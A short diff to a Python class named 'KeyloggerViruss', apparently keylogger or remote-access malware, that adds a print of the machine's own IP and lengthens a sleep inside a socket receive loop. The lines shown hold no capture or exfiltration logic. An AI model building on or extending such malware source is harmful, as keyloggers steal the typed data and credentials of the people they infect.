@@ -96,7 +96,8 @@ class KeyloggerViruss():
                 try:
                     if not self.is_active_server:
                         self.start_session()
-                        time.sleep(0.1)
+                        print(self.ip_self)
+                        time.sleep(0.2)
 
                     try:
                         data, _ = sock.recvfrom(buffer_size)
